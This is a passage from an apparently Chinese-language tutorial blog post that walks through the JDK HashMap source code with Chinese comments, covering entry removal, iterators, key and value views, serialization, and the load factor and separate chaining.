= e.next;</div><div class="line">            <span class="keyword">Object</span> k;</div><div class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp;</div><div class="line">                ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || (<span class="built_in">key</span> != <span class="keyword">null</span> &amp;&amp; <span class="built_in">key</span>.equals(k)))) &#123;</div><div class="line">                modCount++;</div><div class="line">                <span class="built_in">size</span>--;</div><div class="line">                <span class="keyword">if</span> (prev == e)</div><div class="line">                    table[i] = next;</div><div class="line">                <span class="keyword">else</span></div><div class="line">                    prev.next = next;</div><div class="line">                e.recordRemoval(<span class="keyword">this</span>);</div><div class="line">                <span class="keyword">return</span> e;</div><div class="line">            &#125;</div><div class="line">            prev = e;</div><div class="line">            e = next;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> e;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 删除“键值对”</span></div><div class="line">    <span class="keyword">final</span> Entry&lt;K,V&gt; removeMapping(<span class="keyword">Object</span> o) &#123;</div><div class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map.Entry))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line"></div><div class="line">        Map.Entry&lt;K,V&gt; entry = (Map.Entry&lt;K,V&gt;) o;</div><div class="line">        <span class="keyword">Object</span> <span class="built_in">key</span> = entry.getKey();</div><div class="line">        <span class="built_in">int</span> hash = (<span class="built_in">key</span> == <span class="keyword">null</span>) ? <span class="number">0</span> : hash(<span class="built_in">key</span>.hashCode());</div><div class="line">        <span class="built_in">int</span> i = indexFor(hash, table.length);</div><div class="line">        Entry&lt;K,V&gt; prev = table[i];</div><div class="line">        Entry&lt;K,V&gt; e = prev;</div><div class="line"></div><div class="line">        <span class="comment">// 删除链表中的“键值对e”</span></div><div class="line">        <span class="comment">// 本质是“删除单向链表中的节点”</span></div><div class="line">        <span class="keyword">while</span> (e != <span class="keyword">null</span>) &#123;</div><div class="line">            Entry&lt;K,V&gt; next = e.next;</div><div class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; e.equals(entry)) &#123;</div><div class="line">                modCount++;</div><div class="line">                <span class="built_in">size</span>--;</div><div class="line">                <span class="keyword">if</span> (prev == e)</div><div class="line">                    table[i] = next;</div><div class="line">                <span class="keyword">else</span></div><div class="line">                    prev.next = next;</div><div class="line">                e.recordRemoval(<span class="keyword">this</span>);</div><div class="line">                <span class="keyword">return</span> e;</div><div class="line">            &#125;</div><div class="line">            prev = e;</div><div class="line">            e = next;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> e;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 清空HashMap，将所有的元素设为null</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="built_in">clear</span>() &#123;</div><div class="line">        modCount++;</div><div class="line">        Entry[] tab = table;</div><div class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; tab.length; i++)</div><div class="line">            tab[i] = <span class="keyword">null</span>;</div><div class="line">        <span class="built_in">size</span> = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 是否包含“值为value”的元素</span></div><div class="line">    <span class="keyword">public</span> <span class="built_in">boolean</span> containsValue(<span class="keyword">Object</span> value) &#123;</div><div class="line">    <span class="comment">// 若“value为null”，则调用containsNullValue()查找</span></div><div class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">return</span> containsNullValue();</div><div class="line"></div><div class="line">    <span class="comment">// 若“value不为null”，则查找HashMap中是否有值为value的节点。</span></div><div class="line">    Entry[] tab = table;</div><div class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; tab.length ; i++)</div><div class="line">            <span class="keyword">for</span> (Entry e = tab[i] ; e != <span class="keyword">null</span> ; e = e.next)</div><div class="line">                <span class="keyword">if</span> (value.equals(e.value))</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 是否包含null值</span></div><div class="line">    <span class="keyword">private</span> <span class="built_in">boolean</span> containsNullValue() &#123;</div><div class="line">    Entry[] tab = table;</div><div class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; tab.length ; i++)</div><div class="line">            <span class="keyword">for</span> (Entry e = tab[i] ; e != <span class="keyword">null</span> ; e = e.next)</div><div class="line">                <span class="keyword">if</span> (e.value == <span class="keyword">null</span>)</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 克隆一个HashMap，并返回Object对象</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">Object</span> clone() &#123;</div><div class="line">        <span class="keyword">HashMap</span>&lt;K,V&gt; result = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            result = (<span class="keyword">HashMap</span>&lt;K,V&gt;)<span class="keyword">super</span>.clone();</div><div class="line">        &#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</div><div class="line">            <span class="comment">// assert false;</span></div><div class="line">        &#125;</div><div class="line">        result.table = <span class="keyword">new</span> Entry[table.length];</div><div class="line">        result.entrySet = <span class="keyword">null</span>;</div><div class="line">        result.modCount = <span class="number">0</span>;</div><div class="line">        result.<span class="built_in">size</span> = <span class="number">0</span>;</div><div class="line">        result.init();</div><div class="line">        <span class="comment">// 调用putAllForCreate()将全部元素添加到HashMap中</span></div><div class="line">        result.putAllForCreate(<span class="keyword">this</span>);</div><div class="line"></div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Entry是单向链表。</span></div><div class="line">    <span class="comment">// 它是 “HashMap链式存储法”对应的链表。</span></div><div class="line">    <span class="comment">// 它实现了Map.Entry 接口，即实现getKey(), getValue(), setValue(V value), equals(Object o), hashCode()这些函数</span></div><div class="line">    <span class="keyword">static</span> class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123;</div><div class="line">        <span class="keyword">final</span> K <span class="built_in">key</span>;</div><div class="line">        V value;</div><div class="line">        <span class="comment">// 指向下一个节点</span></div><div class="line">        Entry&lt;K,V&gt; next;</div><div class="line">        <span class="keyword">final</span> <span class="built_in">int</span> hash;</div><div class="line"></div><div class="line">        <span class="comment">// 构造函数。</span></div><div class="line">        <span class="comment">// 输入参数包括"哈希值(h)", "键(k)", "值(v)", "下一节点(n)"</span></div><div class="line">        Entry(<span class="built_in">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</div><div class="line">            value = v;</div><div class="line">            next = n;</div><div class="line">            <span class="built_in">key</span> = k;</div><div class="line">            hash = h;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> K getKey() &#123;</div><div class="line">            <span class="keyword">return</span> <span class="built_in">key</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> V getValue() &#123;</div><div class="line">            <span class="keyword">return</span> value;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> V setValue(V newValue) &#123;</div><div class="line">            V oldValue = value;</div><div class="line">            value = newValue;</div><div class="line">            <span class="keyword">return</span> oldValue;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 判断两个Entry是否相等</span></div><div class="line">        <span class="comment">// 若两个Entry的“key”和“value”都相等，则返回true。</span></div><div class="line">        <span class="comment">// 否则，返回false</span></div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="built_in">boolean</span> equals(<span class="keyword">Object</span> o) &#123;</div><div class="line">            <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map.Entry))</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            Map.Entry e = (Map.Entry)o;</div><div class="line">            <span class="keyword">Object</span> k1 = getKey();</div><div class="line">            <span class="keyword">Object</span> k2 = e.getKey();</div><div class="line">            <span class="keyword">if</span> (k1 == k2 || (k1 != <span class="keyword">null</span> &amp;&amp; k1.equals(k2))) &#123;</div><div class="line">                <span class="keyword">Object</span> v1 = getValue();</div><div class="line">                <span class="keyword">Object</span> v2 = e.getValue();</div><div class="line">                <span class="keyword">if</span> (v1 == v2 || (v1 != <span class="keyword">null</span> &amp;&amp; v1.equals(v2)))</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 实现hashCode()</span></div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="built_in">int</span> hashCode() &#123;</div><div class="line">            <span class="keyword">return</span> (<span class="built_in">key</span>==<span class="keyword">null</span>   ? <span class="number">0</span> : <span class="built_in">key</span>.hashCode()) ^</div><div class="line">                   (value==<span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">String</span> toString() &#123;</div><div class="line">            <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 当向HashMap中添加元素时，绘调用recordAccess()。</span></div><div class="line">        <span class="comment">// 这里不做任何处理</span></div><div class="line">        <span class="keyword">void</span> recordAccess(<span class="keyword">HashMap</span>&lt;K,V&gt; m) &#123;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 当从HashMap中删除元素时，绘调用recordRemoval()。</span></div><div class="line">        <span class="comment">// 这里不做任何处理</span></div><div class="line">        <span class="keyword">void</span> recordRemoval(<span class="keyword">HashMap</span>&lt;K,V&gt; m) &#123;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 新增Entry。将“key-value”插入指定位置，bucketIndex是位置索引。</span></div><div class="line">    <span class="keyword">void</span> addEntry(<span class="built_in">int</span> hash, K <span class="built_in">key</span>, V value, <span class="built_in">int</span> bucketIndex) &#123;</div><div class="line">        <span class="comment">// 保存“bucketIndex”位置的值到“e”中</span></div><div class="line">        Entry&lt;K,V&gt; e = table[bucketIndex];</div><div class="line">        <span class="comment">// 设置“bucketIndex”位置的元素为“新Entry”，</span></div><div class="line">        <span class="comment">// 设置“e”为“新Entry的下一个节点”</span></div><div class="line">        table[bucketIndex] = <span class="keyword">new</span> Entry&lt;K,V&gt;(hash, <span class="built_in">key</span>, value, e);</div><div class="line">        <span class="comment">// 若HashMap的实际大小 不小于 “阈值”，则调整HashMap的大小</span></div><div class="line">        <span class="keyword">if</span> (<span class="built_in">size</span>++ &gt;= threshold)</div><div class="line">            resize(<span class="number">2</span> * table.length);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 创建Entry。将“key-value”插入指定位置，bucketIndex是位置索引。</span></div><div class="line">    <span class="comment">// 它和addEntry的区别是：</span></div><div class="line">    <span class="comment">// (01) addEntry()一般用在 新增Entry可能导致“HashMap的实际容量”超过“阈值”的情况下。</span></div><div class="line">    <span class="comment">//   例如，我们新建一个HashMap，然后不断通过put()向HashMap中添加元素；</span></div><div class="line">    <span class="comment">// put()是通过addEntry()新增Entry的。</span></div><div class="line">    <span class="comment">//   在这种情况下，我们不知道何时“HashMap的实际容量”会超过“阈值”；</span></div><div class="line">    <span class="comment">//   因此，需要调用addEntry()</span></div><div class="line">    <span class="comment">// (02) createEntry() 一般用在 新增Entry不会导致“HashMap的实际容量”超过“阈值”的情况下。</span></div><div class="line">    <span class="comment">//   例如，我们调用HashMap“带有Map”的构造函数，它绘将Map的全部元素添加到HashMap中；</span></div><div class="line">    <span class="comment">// 但在添加之前，我们已经计算好“HashMap的容量和阈值”。也就是，可以确定“即使将Map中</span></div><div class="line">    <span class="comment">// 的全部元素添加到HashMap中，都不会超过HashMap的阈值”。</span></div><div class="line">    <span class="comment">//   此时，调用createEntry()即可。</span></div><div class="line">    <span class="keyword">void</span> createEntry(<span class="built_in">int</span> hash, K <span class="built_in">key</span>, V value, <span class="built_in">int</span> bucketIndex) &#123;</div><div class="line">        <span class="comment">// 保存“bucketIndex”位置的值到“e”中</span></div><div class="line">        Entry&lt;K,V&gt; e = table[bucketIndex];</div><div class="line">        <span class="comment">// 设置“bucketIndex”位置的元素为“新Entry”，</span></div><div class="line">        <span class="comment">// 设置“e”为“新Entry的下一个节点”</span></div><div class="line">        table[bucketIndex] = <span class="keyword">new</span> Entry&lt;K,V&gt;(hash, <span class="built_in">key</span>, value, e);</div><div class="line">        <span class="built_in">size</span>++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// HashIterator是HashMap迭代器的抽象出来的父类，实现了公共了函数。</span></div><div class="line">    <span class="comment">// 它包含“key迭代器(KeyIterator)”、“Value迭代器(ValueIterator)”和“Entry迭代器(EntryIterator)”3个子类。</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">abstract</span> class HashIterator&lt;E&gt; implements Iterator&lt;E&gt; &#123;</div><div class="line">        <span class="comment">// 下一个元素</span></div><div class="line">        Entry&lt;K,V&gt; next;</div><div class="line">        <span class="comment">// expectedModCount用于实现fast-fail机制。</span></div><div class="line">        <span class="built_in">int</span> expectedModCount;</div><div class="line">        <span class="comment">// 当前索引</span></div><div class="line">        <span class="built_in">int</span> index;</div><div class="line">        <span class="comment">// 当前元素</span></div><div class="line">        Entry&lt;K,V&gt; current;</div><div class="line"></div><div class="line">        HashIterator() &#123;</div><div class="line">            expectedModCount = modCount;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">size</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// advance to first entry</span></div><div class="line">                Entry[] t = table;</div><div class="line">                <span class="comment">// 将next指向table中第一个不为null的元素。</span></div><div class="line">                <span class="comment">// 这里利用了index的初始值为0，从0开始依次向后遍历，直到找到不为null的元素就退出循环。</span></div><div class="line">                <span class="keyword">while</span> (index &lt; t.length &amp;&amp; (next = t[index++]) == <span class="keyword">null</span>)</div><div class="line">                    ;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="built_in">boolean</span> hasNext() &#123;</div><div class="line">            <span class="keyword">return</span> next != <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 获取下一个元素</span></div><div class="line">        <span class="keyword">final</span> Entry&lt;K,V&gt; nextEntry() &#123;</div><div class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">            Entry&lt;K,V&gt; e = next;</div><div class="line">            <span class="keyword">if</span> (e == <span class="keyword">null</span>)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</div><div class="line"></div><div class="line">            <span class="comment">// 注意！！！</span></div><div class="line">            <span class="comment">// 一个Entry就是一个单向链表</span></div><div class="line">            <span class="comment">// 若该Entry的下一个节点不为空，就将next指向下一个节点;</span></div><div class="line">            <span class="comment">// 否则，将next指向下一个链表(也是下一个Entry)的不为null的节点。</span></div><div class="line">            <span class="keyword">if</span> ((next = e.next) == <span class="keyword">null</span>) &#123;</div><div class="line">                Entry[] t = table;</div><div class="line">                <span class="keyword">while</span> (index &lt; t.length &amp;&amp; (next = t[index++]) == <span class="keyword">null</span>)</div><div class="line">                    ;</div><div class="line">            &#125;</div><div class="line">            current = e;</div><div class="line">            <span class="keyword">return</span> e;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 删除当前元素</span></div><div class="line">        <span class="keyword">public</span> <span class="keyword">void</span> remove() &#123;</div><div class="line">            <span class="keyword">if</span> (current == <span class="keyword">null</span>)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</div><div class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">            <span class="keyword">Object</span> k = current.<span class="built_in">key</span>;</div><div class="line">            current = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">HashMap</span>.<span class="keyword">this</span>.removeEntryForKey(k);</div><div class="line">            expectedModCount = modCount;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// value的迭代器</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> class ValueIterator extends HashIterator&lt;V&gt; &#123;</div><div class="line">        <span class="keyword">public</span> V next() &#123;</div><div class="line">            <span class="keyword">return</span> nextEntry().value;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// key的迭代器</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> class KeyIterator extends HashIterator&lt;K&gt; &#123;</div><div class="line">        <span class="keyword">public</span> K next() &#123;</div><div class="line">            <span class="keyword">return</span> nextEntry().getKey();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Entry的迭代器</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> class EntryIterator extends HashIterator&lt;Map.Entry&lt;K,V&gt;&gt; &#123;</div><div class="line">        <span class="keyword">public</span> Map.Entry&lt;K,V&gt; next() &#123;</div><div class="line">            <span class="keyword">return</span> nextEntry();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 返回一个“key迭代器”</span></div><div class="line">    Iterator&lt;K&gt; newKeyIterator()   &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> KeyIterator();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 返回一个“value迭代器”</span></div><div class="line">    Iterator&lt;V&gt; newValueIterator()   &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ValueIterator();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 返回一个“entry迭代器”</span></div><div class="line">    Iterator&lt;Map.Entry&lt;K,V&gt;&gt; newEntryIterator()   &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> EntryIterator();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// HashMap的Entry对应的集合</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet = <span class="keyword">null</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 返回“key的集合”，实际上返回一个“KeySet对象”</span></div><div class="line">    <span class="keyword">public</span> Set&lt;K&gt; keySet() &#123;</div><div class="line">        Set&lt;K&gt; ks = keySet;</div><div class="line">        <span class="keyword">return</span> (ks != <span class="keyword">null</span> ? ks : (keySet = <span class="keyword">new</span> KeySet()));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Key对应的集合</span></div><div class="line">    <span class="comment">// KeySet继承于AbstractSet，说明该集合中没有重复的Key。</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> class KeySet extends AbstractSet&lt;K&gt; &#123;</div><div class="line">        <span class="keyword">public</span> Iterator&lt;K&gt; iterator() &#123;</div><div class="line">            <span class="keyword">return</span> newKeyIterator();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">int</span> <span class="built_in">size</span>() &#123;</div><div class="line">            <span class="keyword">return</span> <span class="built_in">size</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">boolean</span> contains(<span class="keyword">Object</span> o) &#123;</div><div class="line">            <span class="keyword">return</span> containsKey(o);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">boolean</span> remove(<span class="keyword">Object</span> o) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">HashMap</span>.<span class="keyword">this</span>.removeEntryForKey(o) != <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="built_in">clear</span>() &#123;</div><div class="line">            <span class="keyword">HashMap</span>.<span class="keyword">this</span>.<span class="built_in">clear</span>();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 返回“value集合”，实际上返回的是一个Values对象</span></div><div class="line">    <span class="keyword">public</span> Collection&lt;V&gt; values() &#123;</div><div class="line">        Collection&lt;V&gt; vs = values;</div><div class="line">        <span class="keyword">return</span> (vs != <span class="keyword">null</span> ? vs : (values = <span class="keyword">new</span> Values()));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// “value集合”</span></div><div class="line">    <span class="comment">// Values继承于AbstractCollection，不同于“KeySet继承于AbstractSet”，</span></div><div class="line">    <span class="comment">// Values中的元素能够重复。因为不同的key可以指向相同的value。</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> class Values extends AbstractCollection&lt;V&gt; &#123;</div><div class="line">        <span class="keyword">public</span> Iterator&lt;V&gt; iterator() &#123;</div><div class="line">            <span class="keyword">return</span> newValueIterator();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">int</span> <span class="built_in">size</span>() &#123;</div><div class="line">            <span class="keyword">return</span> <span class="built_in">size</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">boolean</span> contains(<span class="keyword">Object</span> o) &#123;</div><div class="line">            <span class="keyword">return</span> containsValue(o);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="built_in">clear</span>() &#123;</div><div class="line">            <span class="keyword">HashMap</span>.<span class="keyword">this</span>.<span class="built_in">clear</span>();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 返回“HashMap的Entry集合”</span></div><div class="line">    <span class="keyword">public</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() &#123;</div><div class="line">        <span class="keyword">return</span> entrySet0();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 返回“HashMap的Entry集合”，它实际是返回一个EntrySet对象</span></div><div class="line">    <span class="keyword">private</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet0() &#123;</div><div class="line">        Set&lt;Map.Entry&lt;K,V&gt;&gt; es = entrySet;</div><div class="line">        <span class="keyword">return</span> es != <span class="keyword">null</span> ? es : (entrySet = <span class="keyword">new</span> EntrySet());</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// EntrySet对应的集合</span></div><div class="line">    <span class="comment">// EntrySet继承于AbstractSet，说明该集合中没有重复的EntrySet。</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> class EntrySet extends AbstractSet&lt;Map.Entry&lt;K,V&gt;&gt; &#123;</div><div class="line">        <span class="keyword">public</span> Iterator&lt;Map.Entry&lt;K,V&gt;&gt; iterator() &#123;</div><div class="line">            <span class="keyword">return</span> newEntryIterator();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">boolean</span> contains(<span class="keyword">Object</span> o) &#123;</div><div class="line">            <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map.Entry))</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            Map.Entry&lt;K,V&gt; e = (Map.Entry&lt;K,V&gt;) o;</div><div class="line">            Entry&lt;K,V&gt; candidate = getEntry(e.getKey());</div><div class="line">            <span class="keyword">return</span> candidate != <span class="keyword">null</span> &amp;&amp; candidate.equals(e);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">boolean</span> remove(<span class="keyword">Object</span> o) &#123;</div><div class="line">            <span class="keyword">return</span> removeMapping(o) != <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="built_in">int</span> <span class="built_in">size</span>() &#123;</div><div class="line">            <span class="keyword">return</span> <span class="built_in">size</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="built_in">clear</span>() &#123;</div><div class="line">            <span class="keyword">HashMap</span>.<span class="keyword">this</span>.<span class="built_in">clear</span>();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// java.io.Serializable的写入函数</span></div><div class="line">    <span class="comment">// 将HashMap的“总的容量，实际容量，所有的Entry”都写入到输出流中</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">void</span> writeObject(java.io.ObjectOutputStream s)</div><div class="line">        <span class="keyword">throws</span> IOException</div><div class="line">    &#123;</div><div class="line">        Iterator&lt;Map.Entry&lt;K,V&gt;&gt; i =</div><div class="line">            (<span class="built_in">size</span> &gt; <span class="number">0</span>) ? entrySet0().iterator() : <span class="keyword">null</span>;</div><div class="line"></div><div class="line">        <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></div><div class="line">        s.defaultWriteObject();</div><div class="line"></div><div class="line">        <span class="comment">// Write out number of buckets</span></div><div class="line">        s.writeInt(table.length);</div><div class="line"></div><div class="line">        <span class="comment">// Write out size (number of Mappings)</span></div><div class="line">        s.writeInt(<span class="built_in">size</span>);</div><div class="line"></div><div class="line">        <span class="comment">// Write out keys and values (alternating)</span></div><div class="line">        <span class="keyword">if</span> (i != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</div><div class="line">            Map.Entry&lt;K,V&gt; e = i.next();</div><div class="line">            s.writeObject(e.getKey());</div><div class="line">            s.writeObject(e.getValue());</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">362498820763181265</span>L;</div><div class="line"></div><div class="line">    <span class="comment">// java.io.Serializable的读取函数：根据写入方式读出</span></div><div class="line">    <span class="comment">// 将HashMap的“总的容量，实际容量，所有的Entry”依次读出</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">void</span> readObject(java.io.ObjectInputStream s)</div><div class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</div><div class="line">    &#123;</div><div class="line">        <span class="comment">// Read in the threshold, loadfactor, and any hidden stuff</span></div><div class="line">        s.defaultReadObject();</div><div class="line"></div><div class="line">        <span class="comment">// Read in number of buckets and allocate the bucket array;</span></div><div class="line">        <span class="built_in">int</span> numBuckets = s.readInt();</div><div class="line">        table = <span class="keyword">new</span> Entry[numBuckets];</div><div class="line"></div><div class="line">        init();  <span class="comment">// Give subclass a chance to do its thing.</span></div><div class="line"></div><div class="line">        <span class="comment">// Read in size (number of Mappings)</span></div><div class="line">        <span class="built_in">int</span> <span class="built_in">size</span> = s.readInt();</div><div class="line"></div><div class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></div><div class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">size</span>; i++) &#123;</div><div class="line">            K <span class="built_in">key</span> = (K) s.readObject();</div><div class="line">            V value = (V) s.readObject();</div><div class="line">            putForCreate(<span class="built_in">key</span>, value);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 返回“HashMap总的容量”</span></div><div class="line">    <span class="built_in">int</span>   capacity()     &#123; <span class="keyword">return</span> table.length; &#125;</div><div class="line">    <span class="comment">// 返回“HashMap的加载因子”</span></div><div class="line">    <span class="built_in">float</span> loadFactor()   &#123; <span class="keyword">return</span> loadFactor;   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div><br><code>说明</code>：<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>HashMap</code>就是一个散列表，它是通过<code>拉链法</code>解决哈希冲突的。<br>&nbsp;&nbsp;&nbsp;&nbsp;影响<code>HashMap</code>性能的有两个参数：<code>初始容量(initialCapacity)</code>和<code>加载因子(loadFactor)</code>。容量是哈希表中桶的数量，<code>初始容量</code>只是哈希表在创建时的容量。<code>加载因子</code>是哈希表在其容量自动增加之前可以达到多满的一种尺度。当哈希表中的条目数超出了加载因子与当前容量的乘积时，则要对该哈希表进行<code>rehash</code>操作(即重建内部数据结构)，从而哈希表将具有大约两倍的桶数。</p>
<h3 id="HashMap的”拉链法”相关内容"><a href="#HashMap的”拉链法”相关内容" class="headerlink" title="HashMap的”拉链法”相关内容"></a>HashMap的”拉链法”相关内容</h3><h4 id="HashMap数据存储数组"><a href="#HashMap数据存储数组" class="headerlink" title="HashMap数据存储数组"></a>HashMap数据存储数组</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">transient Entry[] <span class="keyword">table</span>;</div></pre></td></tr></table></figure>
<p>HashMap中的<code>key-value</code>都是存储在<code>Entry数组</code>中的。</p>
<h4 id="数据节点Entry的数据结构"><a href="#数据节点Entry的数据结构" class="headerlink" title="数据节点Entry的数据结构"></a>数据节点Entry的数据结构</h4><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
